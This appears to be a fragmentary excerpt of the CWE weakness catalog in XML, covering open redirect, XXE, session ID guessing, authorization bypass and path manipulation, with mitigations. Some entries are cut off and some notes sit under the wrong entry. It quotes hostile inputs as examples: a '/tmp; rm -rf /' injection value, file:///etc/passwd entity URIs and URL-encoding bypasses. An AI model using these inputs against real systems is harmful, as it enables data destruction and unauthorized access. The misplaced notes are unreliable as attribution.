               <Description>Assume all input is malicious. Use a standard input validation mechanism to validate all input for length, type, syntax, and business rules before accepting the data. Use an "accept known good" validation strategy.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use a parameterized query AND make sure that the accepted values conform to the business rules. Construct your SQL statement accordingly.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user.</Intro_Text>
               <Example_Code Nature="bad" Language="C#">
                  <xhtml:div>...<xhtml:br/>conn = new SqlConnection(_ConnectionString);<xhtml:br/>conn.Open();<xhtml:br/>int16 id = System.Convert.ToInt16(invoiceID.Text);<xhtml:br/>SqlCommand query = new SqlCommand( "SELECT * FROM invoices WHERE id = @id", conn);<xhtml:br/>query.Parameters.AddWithValue("@id", id);<xhtml:br/>SqlDataReader objReader = objCommand.ExecuteReader();<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem is that the developer has not considered all of the possible values of id. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user.</Body_Text>

      <Weakness ID="579" Name="J2EE Bad Practices: Non-serializable Object Stored in Session" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The application stores a non-serializable object as an HttpSession attribute, which can hurt reliability.</Description>
         <Extended_Description>A J2EE application can make use of multiple JVMs in order to improve application reliability and performance. In order to make the multiple JVMs appear as a single application to the end user, the J2EE container can replicate an HttpSession object across multiple JVMs so that if one JVM becomes unavailable another can step in and take its place without disrupting the flow of the application. This is only possible if all session data is serializable, allowing the session to be duplicated between the JVMs.</Extended_Description>

         <Notes>
            <Note Type="Relationship">CWE-295 and CWE-599 are very similar, although CWE-599 has a more narrow scope that is only applied to OpenSSL certificates. As a result, other children of CWE-295 can be regarded as children of CWE-599 as well. CWE's use of one-dimensional hierarchical relationships is not well-suited to handle different kinds of abstraction relationships based on concepts like types of resources ("OpenSSL certificate" as a child of "any certificate") and types of behaviors ("not validating expiration" as a child of "improper validation").</Note>

         <Description>The J2EE application is configured to use an insufficient session ID length.</Description>
         <Extended_Description>If an attacker can guess or steal a session ID, then they may be able to take over the user's session (called session hijacking).

               <xhtml:p>Session ID's can be used to identify communicating parties in a web environment.</xhtml:p>
               <xhtml:p>The expected number of seconds required to guess a valid session identifier is given by the equation: (2^B+1)/(2*A*S) Where: - B is the number of bits of entropy in the session identifier. - A is the number of guesses an attacker can try each second. - S is the number of valid session identifiers that are valid and available to be guessed at any given time. The number of bits of entropy in the session identifier is always less than the total number of bits in the session identifier. For example, if session identifiers were provided in ascending order, there would be close to zero bits of entropy in the session identifier no matter the identifier's length. Assuming that the session identifiers are being generated using a good source of random numbers, we will estimate the number of bits of entropy in a session identifier to be half the total number of bits in the session identifier. For realistic identifier lengths this is possible, though perhaps optimistic.</xhtml:p>

               <Description>A lower bound on the number of valid session identifiers that are available to be guessed is the number of users that are active on a site at any given moment. However, any users that abandon their sessions without logging out will increase this number. (This is one of many good reasons to have a short inactive session timeout.) With a 64 bit session identifier, assume 32 bits of entropy. For a large web site, assume that the attacker can try 1,000 guesses per second and that there are 10,000 valid session identifiers at any given moment. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is less than 4 minutes. Now assume a 128 bit session identifier that provides 64 bits of entropy. With a very large web site, an attacker might try 10,000 guesses per second with 100,000 valid session identifiers available to be guessed. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is greater than 292 years.</Description>

      <Weakness ID="601" Name="URL Redirection to Untrusted Site ('Open Redirect')" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.</Description>
         <Extended_Description>An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance.</Extended_Description>

               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>Use a whitelist of approved URLs or domains to be used for redirection.</xhtml:p>

Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>

               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>

However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site.</Body_Text>

         <Description>The software is composed of a server that relies on the client to implement a mechanism that is intended to protect the server.</Description>
         <Extended_Description>When the server relies on protection mechanisms placed on the client side, an attacker can modify the client-side behavior to bypass the protection mechanisms resulting in potentially unexpected interactions between the client and server. The consequences will vary, depending on what the mechanisms are trying to protect.</Extended_Description>

               <Note>Consider a product that consists of two or more processes or nodes that must interact closely, such as a client/server model. If the product uses protection schemes in the client in order to defend from attacks against the server, and the server does not use the same schemes, then an attacker could modify the client in a way that bypasses those schemes. This is a fundamental design flaw that is primary to many weaknesses.</Note>

               <Description>
                  <xhtml:p>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</xhtml:p>
                  <xhtml:p>Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.</xhtml:p>

            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If some degree of trust is required between the two entities, then use integrity checking and strong authentication to ensure that the inputs are coming from a trusted source. Design the product so that this trust is managed in a centralized fashion, especially if there are complex or numerous communication channels, in order to reduce the risks that the implementer will mistakenly omit a check in a single code path.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>

               <Body_Text>The server accepts 2 commands, "AUTH" which authenticates the user, and "CHANGE-ADDRESS" which updates the address field for the username. The client performs the authentication and only sends a CHANGE-ADDRESS for that user if the authentication succeeds. Because the client has already performed the authentication, the server assumes that the username in the CHANGE-ADDRESS is the same as the authenticated user. An attacker could modify the client by removing the code that sends the "AUTH" command and simply executing the CHANGE-ADDRESS.</Body_Text>

         <Notes>
            <Note Type="Relationship">This is a general class of weakness, but most research is focused on more specialized cases, such as path traversal (CWE-22) and symlink following (CWE-61). A symbolic link has a name; in general, it appears like any other file in the file system. However, the link includes a reference to another file, often in another directory - perhaps in another sphere of control. Many common library functions that accept filenames will "follow" a symbolic link and use the link's target instead.</Note>
            <Note Type="Maintenance">The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 "Resource Injection," as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the "identifier used to access a system resource" such as a file name or port number, yet it explicitly states that the "resource injection" term does not apply to "path manipulation," which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer.</Note>

      <Weakness ID="611" Name="Improper Restriction of XML External Entity Reference ('XXE')" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The software processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.</Description>
         <Extended_Description>
            <xhtml:p>XML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of XML entities. It is possible to define an entity by providing a substitution string in the form of a URI. The XML parser can access the contents of this URI and embed these contents back into the XML document for further processing.</xhtml:p>
            <xhtml:p>By submitting an XML file that defines an external entity with a file:// URI, an attacker can cause the processing application to read the contents of a local file. For example, a URI such as "file:///c:/winnt/win.ini" designates (in Windows) the file C:\Winnt\win.ini, or file:///etc/passwd designates the password file in Unix-based systems. Using URIs with other schemes such as http://, the attacker can force the application to make outgoing requests to servers that the attacker cannot reach directly, which can be used to bypass firewall restrictions or hide the source of attacks such as port scanning.</xhtml:p>
            <xhtml:p>Once the content of the URI is read, it is fed back into the application that is processing the XML. This application may echo back the data (e.g. in an error message), thereby exposing the file contents.</xhtml:p>

         <Notes>
            <Note Type="Relationship">CWE-918 (SSRF) and CWE-611 (XXE) are closely related, because they both involve web-related technologies and can launch outbound requests to unexpected destinations. However, XXE can be performed client-side, or in other contexts in which the software is not acting directly as a server, so the "Server" portion of the SSRF acronym does not necessarily apply.</Note>

         <Notes>
            <Note Type="Other">The lack of proper session expiration may improve the likely success of certain attacks. For example, an attacker may intercept a session ID, possibly via a network sniffer or Cross-site Scripting attack. Although short session expiration times do not help if a stolen token is immediately used, they will protect against ongoing replaying of the session ID. In another scenario, a user might access a web site from a shared computer (such as at a library, Internet cafe, or open work environment). Insufficient Session Expiration could allow an attacker to use the browser's back button to access web pages previously accessed by the victim.</Note>

      <Weakness ID="639" Name="Authorization Bypass Through User-Controlled Key" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.</Description>
         <Extended_Description>
            <xhtml:p>Retrieval of a user record occurs in the system based on some key value that is under user control. The key would typically identify a user-related record stored in the system and would be used to lookup that record for presentation to the user. It is likely that an attacker would have to be an authenticated user in the system. However, the authorization process would not properly check the data access operation to ensure that the authenticated user performing the operation has sufficient entitlements to perform the requested data access, hence bypassing any other authorization checks present in the system.</xhtml:p>
            <xhtml:p>For example, attackers can look at places where user specific data is retrieved (e.g. search screens) and determine whether the key for the item being looked up is controllable externally. The key may be a hidden field in the HTML form field, might be passed as a URL parameter or as an unencrypted cookie variable, then in each of these cases it will be possible to tamper with the key value.</xhtml:p>
            <xhtml:p>One manifestation of this weakness is when a system uses sequential or otherwise easily-guessable session IDs that would allow one user to easily switch to another user's session and read/modify their data.</xhtml:p>

               <Description>The "Insecure Direct Object Reference" term, as described in the OWASP Top Ten, is broader than this CWE because it also covers path traversal (CWE-22). Within the context of vulnerability theory, there is a similarity between the OWASP concept and CWE-706: Use of Incorrectly-Resolved Name or Reference.</Description>

      <Weakness ID="640" Name="Weak Password Recovery Mechanism for Forgotten Password" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.</Description>
         <Extended_Description>
            <xhtml:p>It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Very often the password recovery mechanism is weak, which has the effect of making it more likely that it would be possible for a person other than the legitimate system user to gain access to that user's account. Weak password recovery schemes completely undermine a strong password authentication scheme.</xhtml:p>
            <xhtml:p>This weakness may be that the security question is too easy to guess or find an answer to (e.g. because the question is too common, or the answers can be found using social media). Or there might be an implementation weakness in the password recovery mechanism code that may for instance trick the system into e-mailing the new password to an e-mail account other than that of the user. There might be no throttling done on the rate of password resets so that a legitimate user can be denied service by an attacker if an attacker tries to recover their password in a rapid succession. The system may send the original password to the user rather than generating a new temporary password. In summary, password recovery functionality, if not carefully designed and implemented can often become the system's weakest link that can be misused in a way that would allow an attacker to gain unauthorized access to the system.</xhtml:p>

            <Demonstrative_Example>
               <Intro_Text>A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.</Intro_Text>

            <Note Type="Maintenance">This entry might be reclassified as a category or "loose composite," since it lists multiple specific errors that can make the mechanism weak. However, under view 1000, it could be a weakness under protection mechanism failure, although it is different from most PMF issues since it is related to a feature that is designed to bypass a protection mechanism (specifically, the lack of knowledge of a password).</Note>
            <Note Type="Maintenance">This entry probably needs to be split; see extended description.</Note>

      </Weakness>
      <Weakness ID="641" Name="Improper Restriction of Names for Files and Other Resources" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The application constructs the name of a file or other resource using input from an upstream component, but it does not restrict or incorrectly restricts the resulting name.</Description>
         <Extended_Description>This may produce resultant weaknesses. For instance, if the names of these resources contain scripting characters, it is possible that a script may get executed in the client's browser if the application ever displays the name of the resource on a dynamically generated web page. Alternately, if the resources are consumed by some application parser, a specially crafted name can exploit some vulnerability internal to the parser, potentially resulting in execution of arbitrary code on the server machine. The problems will vary based on the context of usage of such malformed resource names and whether vulnerabilities are present in or assumptions are made by the targeted technology that would make code execution possible.</Extended_Description>

      <Weakness ID="642" Name="External Control of Critical State Data" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software stores security-critical state information about its users, or the software itself, in a location that is accessible to unauthorized actors.</Description>
         <Extended_Description>
            <xhtml:p>If an attacker can modify the state information without detection, then it could be used to perform unauthorized actions or access unexpected resources, since the application programmer does not expect that the state can be changed.</xhtml:p>
            <xhtml:p>State information can be stored in various locations such as a cookie, in a hidden web form field, input parameter or argument, an environment variable, a database record, within a settings file, etc. All of these locations have the potential to be modified by an attacker. When this state information is used to control security or determine resource usage, then it may create a vulnerability. For example, an application may perform authentication, then save the state in an "authenticated=true" cookie. An attacker may simply create this cookie in order to bypass the authentication.</xhtml:p>

            <Demonstrative_Example>
               <Intro_Text>The following code segment implements a basic server that uses the "ls" program to perform a directory listing of the directory that is listed in the "HOMEDIR" environment variable. The code intends to allow the user to specify an alternate "LANG" environment variable. This causes "ls" to customize its output based on a given language, which is an important capability when supporting internationalization.</Intro_Text>

                  <xhtml:div>$ENV{"HOMEDIR"} = "/home/mydir/public/";<xhtml:br/>my $stream = AcceptUntrustedInputStream();<xhtml:br/>while (&lt;$stream&gt;) {<xhtml:div style="margin-left:10px;">

               <Body_Text>The programmer takes care to call a specific "ls" program and sets the HOMEDIR to a fixed value. However, an attacker can use a command such as "ENV HOMEDIR /secret/directory" to specify an alternate directory, enabling a path traversal attack (CWE-22). At the same time, other attacks are enabled as well, such as OS command injection (CWE-78) by setting HOMEDIR to a value such as "/tmp; rm -rf /". In this case, the programmer never intends for HOMEDIR to be modified, so input validation for HOMEDIR is not the solution. A partial solution would be a whitelist that only allows the LANG variable to be specified in the ENV command. Alternately, assuming this is an authenticated user, the language could be stored in a local file so that no ENV command at all would be needed.</Body_Text>

      <Weakness ID="645" Name="Overly Restrictive Account Lockout Mechanism" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software contains an account lockout protection mechanism, but the mechanism is too restrictive and can be triggered too easily, which allows attackers to deny service to legitimate users by causing their accounts to be locked out.</Description>
         <Extended_Description>Account lockout is a security feature often present in applications as a countermeasure to the brute force attack on the password based authentication mechanism of the system. After a certain number of failed login attempts, the users' account may be disabled for a certain period of time or until it is unlocked by an administrator. Other security events may also possibly trigger account lockout. However, an attacker may use this very security feature to deny service to legitimate system users. It is therefore important to ensure that the account lockout security mechanism is not overly restrictive.</Extended_Description>

               <Intro_Text>A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.</Intro_Text>

      </Weakness>
      <Weakness ID="647" Name="Use of Non-Canonical URL Paths for Authorization Decisions" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software defines policy namespaces and makes authorization decisions based on the assumption that a URL is canonical. This can allow a non-canonical URL to bypass the authorization.</Description>
         <Extended_Description>
            <xhtml:p>If an application defines policy namespaces and makes authorization decisions based on the URL, but it does not require or convert to a canonical URL before making the authorization decision, then it opens the application to attack. For example, if the application only wants to allow access to http://www.example.com/mypage, then the attacker might be able to bypass this restriction using equivalent URLs such as:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>http://WWW.EXAMPLE.COM/mypage</xhtml:li>
                  <xhtml:li>http://www.example.com/%6Dypage (alternate encoding)</xhtml:li>
                  <xhtml:li>http://192.168.1.1/mypage (IP address)</xhtml:li>
                  <xhtml:li>http://www.example.com/mypage/ (trailing /)</xhtml:li>
                  <xhtml:li>http://www.example.com:80/mypage</xhtml:li>
               </xhtml:ul>
            </xhtml:div>
            <xhtml:p>Therefore it is important to specify access control policy that is based on the path information in some canonical form with all alternate encodings rejected (which can be accomplished by a default deny rule).</xhtml:p>

               <Intro_Text>Example from CAPEC (CAPEC ID: 4, "Using Alternative IP Address Encodings"). An attacker identifies an application server that applies a security policy based on the domain and application name, so the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by putting in the IP address of the host the application authentication and authorization controls may be bypassed http://192.168.0.1:8080/application. The attacker relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions.</Intro_Text>

      <Weakness ID="649" Name="Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software uses obfuscation or encryption of inputs that should not be mutable by an external actor, but the software does not use integrity checks to detect if those inputs have been modified.</Description>
         <Extended_Description>When an application relies on obfuscation or incorrectly applied / weak encryption to protect client-controllable tokens or parameters, that may have an effect on the user state, system state, or some decision made on the server. Without protecting the tokens/parameters for integrity, the application is vulnerable to an attack where an adversary blindly traverses the space of possible values of the said token/parameter in order to attempt to gain an advantage. The goal of the attacker is to find another admissible value that will somehow elevate their privileges in the system, disclose information or change the behavior of the system in some way beneficial to the attacker. If the application does not protect these critical tokens/parameters for integrity, it will not be able to determine that these values have been tampered with. Measures that are used to protect data for confidentiality should not be relied upon to provide the integrity service.</Extended_Description>

               <Description>Obfuscation should not be relied upon. If encryption is used, it needs to be properly applied (i.e. proven algorithm and implementation, use padding, use random initialization vector, user proper encryption mode). Even with proper encryption where the ciphertext does not leak information about the plaintext or reveal its structure, compromising integrity is possible (although less likely) without the provision of the integrity service.</Description>

         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-0039</Reference>
               <Description>An IPSec configuration does not perform integrity checking of the IPSec packet as the result of either not configuring ESP properly to support the integrity service or using AH improperly. In either case, the security gateway receiving the IPSec packet would not validate the integrity of the packet to ensure that it was not changed. Thus if the packets were intercepted the attacker could undetectably change some of the bits in the packets. The meaningful bit flipping was possible due to the known weaknesses in the CBC encryption mode. Since the attacker knew the structure of the packet, they were able (in one variation of the attack) to use bit flipping to change the destination IP of the packet to the destination machine controlled by the attacker. And so the destination security gateway would decrypt the packet and then forward the plaintext to the machine controlled by the attacker. The attacker could then read the original message. For instance if VPN was used with the vulnerable IPSec configuration the attacker could read the victim's e-mail. This vulnerability demonstrates the need to enforce the integrity service properly when critical data could be modified by an attacker. This problem might have also been mitigated by using an encryption mode that is not susceptible to bit flipping attacks, but the preferred mechanism to address this problem still remains message verification for integrity. While this attack focuses on the network layer and requires a man in the middle scenario, the situation is not much different at the software level where an attacker can modify tokens/parameters used by the application.</Description>

               <Description>Some people and publications use the term "Separation of Privilege" to describe this weakness, but this term has dual meanings in current usage. This node conflicts with the original definition of "Separation of Privilege" by Saltzer and Schroeder; that original definition is more closely associated with CWE-654.

               <Intro_Text>Single sign-on technology is intended to make it easier for users to access multiple resources or domains without having to authenticate each time. While this is highly convenient for the user and attempts to address problems with psychological acceptability, it also means that a compromise of a user's credentials can provide immediate access to all other resources or domains.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The traditional UNIX privilege model provides root with arbitrary access to all resources, but root is frequently the only user that has privileges. As a result, administrative tasks require root privileges, even if those tasks are limited to a small area, such as updating user man pages. Some UNIX flavors have a "bin" user that is the owner of system executables, but since root relies on executables owned by bin, a compromise of the bin account can be leveraged for root privileges by modifying a bin-owned executable, such as CVE-2007-4238.</Intro_Text>

         <Notes>
            <Note Type="Relationship">There is a close association with CWE-250 (Execution with Unnecessary Privileges). CWE-653 is about providing separate components for each privilege; CWE-250 is about ensuring that each component has the least amount of privileges possible. In this fashion, compartmentalization becomes one mechanism for reducing privileges.</Note>
            <Note Type="Terminology">The term "Separation of Privilege" is used in several different ways in the industry, but they generally combine two closely related principles: compartmentalization (this node) and using only one factor in a security decision (CWE-654). Proper compartmentalization implicitly introduces multiple factors into a security decision, but there can be cases in which multiple factors are required for authentication or other mechanisms that do not involve compartmentalization, such as performing all required checks on a submitted certificate. It is likely that CWE-653 and CWE-654 will provoke further discussion.</Note>

               <Intro_Text>The design of TCP relies on the secrecy of Initial Sequence Numbers (ISNs), as originally covered in CVE-1999-0077. If ISNs can be guessed (due to predictability, CWE-330) or sniffed (due to lack of encryption, CWE-311), then an attacker can hijack or spoof connections. Many TCP implementations have had variations of this problem over the years, including CVE-2004-0641, CVE-2002-1463, CVE-2001-0751, CVE-2001-0328, CVE-2001-0288, CVE-2001-0163, CVE-2001-0162, CVE-2000-0916, and CVE-2000-0328.</Intro_Text>

         <Description>The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource.</Description>
         <Extended_Description>
            <xhtml:p>Resources such as files and directories may be inadvertently exposed through mechanisms such as insecure permissions, or when a program accidentally operates on the wrong object. For example, a program may intend that private files can only be provided to a specific user. This effectively defines a control sphere that is intended to prevent attackers from accessing these private files. If the file permissions are insecure, then parties other than the user will be able to access those files.</xhtml:p>
            <xhtml:p>A separate control sphere might effectively require that the user can only access the private files, but not any other files on the system. If the program does not ensure that the user is only requesting private files, then the user might be able to access other files on the system.</xhtml:p>
            <xhtml:p>In either case, the end result is that a resource has been exposed to the wrong party.</xhtml:p>

         <Notes>
            <Note Type="Theoretical">A "control sphere" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for "administrators" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be "users who are authenticated to the operating system on which the product is installed." Each sphere has different sets of actors and allowable behaviors.</Note>

      <Weakness ID="671" Name="Lack of Administrator Control over Security" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product uses security features in a way that prevents the product's administrator from tailoring security settings to reflect the environment in which the product is being used. This introduces resultant weaknesses or prevents it from operating at a level of security that is desired by the administrator.</Description>
         <Extended_Description>If the product's administrator does not have the ability to manage security-related decisions at all times, then protecting the product from outside threats - including the product's developer - can become impossible. For example, a hard-coded account name and password cannot be changed by the administrator, thus exposing that product to attacks that the administrator can not prevent.</Extended_Description>

         <Description>The product does not prevent the definition of control spheres from external actors.</Description>
         <Extended_Description>Typically, a product defines its control sphere within the code itself, or through configuration by the product's administrator.

         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Consider a blog publishing tool, which might have three explicit control spheres: the creation of articles, only accessible to a "publisher;" commenting on articles, only accessible to a "commenter" who is a registered user; and reading articles, only accessible to an anonymous reader. Suppose that the application is deployed on a web server that is shared with untrusted parties. If a local user can modify the data files that define who a publisher is, then this user has modified the control sphere. In this case, the issue would be resultant from another weakness such as insufficient permissions.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In Untrusted Search Path (CWE-426), a user might be able to define the PATH environment variable to cause the product to search in the wrong directory for a library to load. The product's intended sphere of control would include "resources that are only modifiable by the person who installed the product." The PATH effectively changes the definition of this sphere so that it overlaps the attacker's sphere of control.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Notes>
            <Note Type="Theoretical">A "control sphere" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for "administrators" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be "users who are authenticated to the operating system on which the product is installed." Each sphere has different sets of actors and allowable behaviors.</Note>

         <Notes>
            <Note Type="Relationship">This is a high-level class that might have some overlap with other classes. It could be argued that even "normal" weaknesses such as buffer overflows involve unusual or exceptional conditions. In that sense, this might be an inherent aspect of most other weaknesses within CWE, similar to API Abuse (CWE-227) and Indicator of Poor Code Quality (CWE-398). However, this entry is currently intended to unify disparate concepts that do not have other places within the Research Concepts view (CWE-1000).</Note>

      <Weakness ID="73" Name="External Control of File Name or Path" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software allows user input to control or influence paths or file names that are used in filesystem operations.</Description>
         <Extended_Description>
            <xhtml:p>This could allow an attacker to access or modify system files or other files that are critical to the application.</xhtml:p>
            <xhtml:p>Path manipulation errors occur when the following two conditions are met:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div>1. An attacker can specify a path used in an operation on the filesystem.</xhtml:div>
               <xhtml:div>2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.</xhtml:div>

               <Description>When the set of filenames is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames, and reject all other inputs. For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap provide this capability.</Description>

               <Description>
                  <xhtml:p>Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict all access to files within a particular directory.</xhtml:p>
                  <xhtml:p>Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>

               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>

            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>

               <Description>Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links (CWE-23, CWE-59).</Description>

               <Description>If you are using PHP, configure your application so that it does not use register_globals. During implementation, develop your application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>

               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>

            <Mitigation>
               <Phase>Testing</Phase>
